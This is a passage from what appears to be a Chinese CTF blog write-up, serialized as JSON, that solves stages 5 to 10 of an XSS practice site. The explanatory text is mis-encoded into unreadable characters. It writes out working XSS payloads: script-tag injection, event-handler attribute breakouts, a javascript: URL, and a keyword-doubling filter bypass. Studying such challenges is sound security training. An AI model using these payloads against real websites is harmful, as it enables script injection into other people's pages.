close\n\np1=123&amp;p2=Japan&amp;p3=&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;Stage #5å‘ç°é™åˆ¶äº†è¾“å…¥é•¿åº¦å¹¶ä¸”ä¸ºvalueæ ‡ç­¾ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹é•¿åº¦å¹¶é—­åˆvalue\nshell&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;&quot;Stage #6å‘ç°ä¸ç¬¬äºŒå…³ç±»ä¼¼ï¼Œä½†æ˜¯ä½¿ç”¨ç¬¬äºŒå…³expæ‰“ä¸é€šï¼Œå‘ç°&lt;&gt;è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨â€é—­åˆã€‚\nshell&quot; onmouseover=alert(document.domain) name=&quot;1onmouseoveræ˜¯é¼ æ ‡ç§»åˆ°ä¸Šé¢å°±ä¼šè§¦å‘çš„äº‹ä»¶\nStage #7è·Ÿç¬¬å…­å…³ä¸€æ ·è¿‡æ»¤&lt;&gt;ï¼Œä½†æ˜¯åŒæ—¶å‘ç°â€ä¹Ÿè¢«è¿‡æ»¤ï¼Œæ— æ³•ç”¨â€åˆ†éš”å±æ€§ï¼Œä½†æ˜¯å¯ä»¥ç”¨ç©ºæ ¼åˆ†éš”ã€‚\nshell&quot; onclick=alert(document.domain)ã€€ã€€Stage #8è§‚å¯Ÿé¢˜ç›®è¦æ±‚è®©æˆ‘ä»¬åœ¨urlä¸­è¿è¡Œjavascriptã€‚\nshelljavascript:alert(document.domain)æ’å…¥äº†ä¸€ä¸ªurlï¼Œç‚¹å‡»å³å¯å¼¹çª—ã€‚\nStage #9æ ¹æ®hintæˆ‘ä»¬å‘ç°ä½¿ç”¨çš„utf-7ã€‚\nç›´æ¥ä¿®æ”¹å…ƒç´ \næ”¹ä¸ºç¬¬äºŒå…³çš„expå³å¯\nshell&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.domain) /&gt;&lt;&quot;Stage #10ç»è¿‡æµ‹è¯•ï¼Œå‘ç°domainè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç›´æ¥åŒå†™ç»•è¿‡ã€‚\nshell&quot;&gt;&lt;img src=&#39;#&#39; onerror=alert(document.dodomainmain) /&gt;&lt;&quot;","slug":"XSS Challenges","date":"2021-08-15T10:49:36.000Z","categories_index":"CTF","tags_index":"XSS","author_index":"xmmlaz"}]